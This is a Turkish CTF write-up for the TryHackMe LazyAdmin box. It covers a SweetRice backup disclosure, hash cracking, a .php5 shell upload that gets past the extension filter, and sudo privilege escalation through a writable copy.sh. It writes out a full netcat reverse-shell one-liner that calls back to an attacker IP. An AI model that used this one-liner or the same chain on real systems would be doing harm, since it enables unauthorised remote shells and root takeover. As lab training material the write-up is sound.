---
title: "LayzAdmin WriteUp"
header:
 
categories:
   - CTF
tag:
   -TryHackMe
---

## Nmap

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/layzAdmin/nmap.png){: .align-center}

Dirb ile hidden directory tespit etmeye çalıştığımda content ve content/as isimli iki adet dizini tespit ettim.

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/layzAdmin/dirb.png){: .align-center}

hedefIP/content sayfasını ziyaret ettiğimde management system olarak SweetRice kullanıldığı görüntülenmektedir.

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/layzAdmin/sweet.png){: .align-center}

SweetRice hakkında zafiyet araştırması yapıldığında ise birden fazla çıktı görüntülenmektedir.

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/layzAdmin/sweetRice.png){: .align-center}

SweetRice 1.5.1 - Backup Disclosure zafiyeti “http://localhost/inc/mysql_backup" end pointinde yedeklerin disclosure olduğunu gördüm.

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/layzAdmin/backup.png){: .align-center}

Backup dosyası içerisinde bir kullanıcı adı ve hashlenmiş haldeki parolayı buldum. Hash’i CrackStation kullanarak kırdığımda parolaya ulaştım.

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/layzAdmin/crackstation.png){: .align-center}

/content/as sayfası SweetRice'ın login sayfasıdır. Elde edilen kimlik bilgileri ile giriş yapıldıktan sonra potansiyel güvenlik zafiyetleri araştırılmaktadır. Tema sekmesinde reverse shell include edilerek hedef sistemde erişim hedeflenmektedir.

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/layzAdmin/contentas.png){: .align-center}

Fakat yüklenilen dosyaya erişilememektedir. Bu yüzden farklı bir giriş noktası olan MediaCenter sekmesi ziyaret edilmektedir.

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/layzAdmin/mediacenter.png){: .align-center}

.php uzantılı shell yüklendiğinde sistem kabul etmemektedir fakat .php5 olarak uzantısı değiştirip yüklendiğinde sistem kabul etmektedir. Saldırı makinesinde ilgili port dinlenerek exploit tetiklenmektedir.

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/layzAdmin/netcat.png){: .align-center}

User.txt

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/layzAdmin/userflag.png){: .align-center}

Yetki yükseltmek için "sudo -l" yapıldığında perl ve backup.pl dosyalarının super user yetkileri ile çalışabildiği görüntülenmektedir. Ek olarak SUID bitleri incelendiğinde herhangi bir şey tespit edilememektedir.

backup.pl dosyası /etc/copy.sh dosyasını yürütmektedir.

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/layzAdmin/backupl.png){: .align-center}

copy.sh dosyası incelendiğinde ise dosya üzerinde değişiklik yapabilme (yazma) yetkisine sahip olunduğu gözlemlenmektedir.

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/layzAdmin/copysh.png){: .align-center}

copy.sh dosyasının içeriğini “rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.63.80 1235 >/tmp/f”  ile değiştirilmektedir.

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/layzAdmin/echo.png){: .align-center}

"sudo -l" çıktısında görüntülenen backup.pl dosyası super user yetkileriyle çalışmaktadır ve içeriği değiştirilen, root yetkilerine erişmeye yardımcı dosyayı çalıştırmaktadır. İlgili port dinlenerek backup.pl dosyası çalıştırılmaktadır.

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/layzAdmin/sudo.png){: .align-center}

Sonuç olarak yetki yükseltme gerçekleşmektedir ve root.txt dosyasının içeriği elde edilmektedir.

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/layzAdmin/rootflag.png){: .align-center}